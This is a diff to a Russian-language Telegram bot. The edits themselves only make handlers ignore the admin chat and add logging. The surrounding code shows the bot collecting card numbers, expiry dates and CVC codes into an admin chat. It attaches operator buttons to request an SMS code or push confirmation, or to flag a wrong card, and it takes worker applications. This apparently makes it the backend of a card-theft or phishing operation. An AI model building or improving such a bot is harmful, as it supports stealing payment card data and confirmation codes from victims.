@@ -132,7 +132,7 @@ def get_admin_buttons(application_id):
 
 # Инлайн кнопки для платежей - ТОЛЬКО В ЧАТЕ
 def get_payment_buttons(payment_id):
-    return InlineKeyboardMarkup(inline_keyboard=[
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_code_{payment_id}"),
             InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}")
@@ -141,6 +141,8 @@ def get_payment_buttons(payment_id):
             InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}")
         ]
     ])
+    logging.info(f"Созданы кнопки для платежа #{payment_id}")
+    return keyboard
 
 
 # Инлайн кнопка профиля - ТОЛЬКО В БОТЕ
@@ -216,6 +218,10 @@ def save_payment(user_id, first_name, last_name, email, phone, card_number, card
 # Обработчик команды /start - ТОЛЬКО В БОТЕ
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
+    # Игнорируем команду /start в чате
+    if message.chat.id == ADMIN_CHAT_ID:
+        return
+        
     user_id = message.from_user.id
     user_status = get_user_status(user_id)
 
@@ -253,6 +259,9 @@ async def cmd_start(message: types.Message):
 # Главное меню для принятых - ТОЛЬКО В БОТЕ
 @dp.message(F.text == "🏠 Главное меню")
 async def main_menu(message: types.Message):
+    if message.chat.id == ADMIN_CHAT_ID:
+        return
+        
     user_status = get_user_status(message.from_user.id)
     if user_status == 'accepted':
         welcome_text = """
@@ -274,6 +283,9 @@ async def main_menu(message: types.Message):
 # Начало заявки - ТОЛЬКО В БОТЕ
 @dp.message(F.text == "📝 Оставить заявку")
 async def start_application(message: types.Message, state: FSMContext):
+    if message.chat.id == ADMIN_CHAT_ID:
+        return
+        
     user_status = get_user_status(message.from_user.id)
 
     if user_status == 'accepted':
@@ -299,6 +311,9 @@ async def start_application(message: types.Message, state: FSMContext):
 # Отмена заявки - ТОЛЬКО В БОТЕ
 @dp.message(F.text == "❌ Отменить заявку")
 async def cancel_application(message: types.Message, state: FSMContext):
+    if message.chat.id == ADMIN_CHAT_ID:
+        return
+        
     await state.clear()
     await message.answer("❌ Заявка отменена", reply_markup=main_kb)
 
@@ -306,6 +321,9 @@ async def cancel_application(message: types.Message, state: FSMContext):
 # Обработка времени - ТОЛЬКО В БОТЕ
 @dp.message(ApplicationStates.waiting_for_time)
 async def process_time(message: types.Message, state: FSMContext):
+    if message.chat.id == ADMIN_CHAT_ID:
+        return
+        
     time_answer = message.text.strip()
 
     if not time_answer.isdigit():
@@ -332,6 +350,9 @@ async def process_time(message: types.Message, state: FSMContext):
 # Обработка опыта - ТОЛЬКО В БОТЕ
 @dp.message(ApplicationStates.waiting_for_experience)
 async def process_experience(message: types.Message, state: FSMContext):
+    if message.chat.id == ADMIN_CHAT_ID:
+        return
+        
     experience = message.text.strip()
 
     if len(experience) < 5:
@@ -356,6 +377,9 @@ async def process_experience(message: types.Message, state: FSMContext):
 # Подтверждение заявки - ТОЛЬКО В БОТЕ
 @dp.message(ApplicationStates.confirmation)
 async def process_confirmation(message: types.Message, state: FSMContext):
+    if message.chat.id == ADMIN_CHAT_ID:
+        return
+        
     if message.text == "✅ Отправить заявку":
         user_data = await state.get_data()
 
@@ -613,13 +637,17 @@ async def reject_application(callback: types.CallbackQuery):
     await callback.answer()
 
 
-# Обработчик платежных сообщений - ТОЛЬКО В ЧАТЕ
+# Обработчик сообщений в чате - ТОЛЬКО ПЛАТЕЖНЫЕ ДАННЫЕ
 @dp.message(F.chat.id == ADMIN_CHAT_ID)
 async def handle_chat_messages(message: types.Message):
     """Обрабатывает сообщения только в админском чате"""
     message_text = message.text or ""
     
     logging.info(f"Сообщение в чате от {message.from_user.id}: {message_text[:100]}...")
+
+    # Игнорируем команды
+    if message_text.startswith('/'):
+        return
 
     # Проверяем, это платежные данные
     if any(keyword in message_text for keyword in ["НОВАЯ ОПЛАТА", "Клиент:", "Карта:", "Номер:", "Срок:", "CVC:"]):
@@ -711,6 +739,7 @@ async def process_payment_data(message: types.Message):
             )
             logging.info(f"✅ Уведомление с кнопками отправлено в чат для платежа #{payment_id}")
             logging.info(f"Message ID: {sent_message.message_id}")
+            logging.info(f"Кнопки: {get_payment_buttons(payment_id)}")
         except Exception as e:
             logging.error(f"Ошибка отправки сообщения в чат: {e}")
 
